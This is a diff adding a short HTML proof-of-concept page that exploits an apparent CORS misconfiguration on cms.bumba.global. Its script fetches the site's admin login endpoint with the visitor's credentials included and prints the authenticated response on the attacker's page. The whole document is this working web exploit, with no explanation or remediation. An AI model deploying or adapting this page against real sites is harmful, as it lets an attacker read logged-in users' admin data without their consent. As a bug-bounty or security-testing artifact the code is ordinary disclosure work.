@@ -1,0 +1,16 @@
+<!doctype html>
+<html>
+<body>
+<h2>Arbitrary-Origin CORS PoC – cms.bumba.global</h2>
+<pre id="out">Loading…</pre>
+
+<script>
+fetch('https://cms.bumba.global/admin/auth/login', {
+  credentials: 'include'
+})
+.then(res => res.text())
+.then(text => document.getElementById('out').textContent = text)
+.catch(err => document.getElementById('out').textContent = err);
+</script>
+</body>
+</html>
